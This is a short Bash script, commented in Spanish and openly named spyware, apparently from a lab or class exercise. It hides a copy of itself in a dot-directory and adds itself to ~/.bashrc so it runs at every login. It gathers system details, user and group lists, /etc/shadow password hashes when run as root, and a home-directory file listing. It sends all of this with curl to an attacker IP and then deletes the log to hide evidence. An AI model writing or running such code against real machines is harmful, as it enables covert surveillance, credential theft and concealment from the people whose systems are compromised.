#!/bin/bash

# Nombre del archivo del spyware
SPYWARE_NAME="spyware.sh"

# Ruta oculta a donde se copiará
HIDDEN_DIR="/config/.oculto"
HIDDEN_PATH="$HIDDEN_DIR/$SPYWARE_NAME"

# Archivo donde se guardará la información
OUTPUT_FILE="$HIDDEN_DIR/sysinfo.log"

# Dirección IP de la máquina atacante
ATACANTE_IP="192.168.64.5"

# Verificar si ya está instalado
if [ ! -f "$HIDDEN_PATH" ]; then
    # Crear el directorio oculto si no existe
    mkdir -p "$HIDDEN_DIR"

    # Copiar el archivo actual al directorio oculto
    cp "$0" "$HIDDEN_PATH"
    
    # Dar permisos de ejecución
    chmod +x "$HIDDEN_PATH"

    # Agregar al archivo ~/.bashrc para autoinicio
    echo "$HIDDEN_PATH &" >> ~/.bashrc
fi

# Función principal (aquí va como recaba información)
{
    echo "=== Información del kernel y la arquitectura ==="
    uname -a

    echo "=== Sistema operativo y versión ==="
    cat /etc/os-release

    echo "=== Procesos activos ==="
    ps aux

    echo "=== Usuarios del sistema ==="
    cat /etc/passwd

    echo "=== Grupos del sistema ==="
    cat /etc/group

    # Intentar leer /etc/shadow si tiene permisos de root
    if [ "$(id -u)" -eq 0 ]; then
        echo "=== Hash de contraseñas de usuarios ==="
        cat /etc/shadow
    else
        echo "No tienes permisos de root para leer /etc/shadow."
    fi
    
    echo "=== Archivos en el directorio HOME ==="
    find ~ -type f -exec ls -lh {} \;

} >> "$OUTPUT_FILE"

# Enviar datos al atacante
curl -X POST http://$ATACANTE_IP:8080 --data-binary @"$OUTPUT_FILE"

# Eliminar evidencia
rm -f "$OUTPUT_FILE"

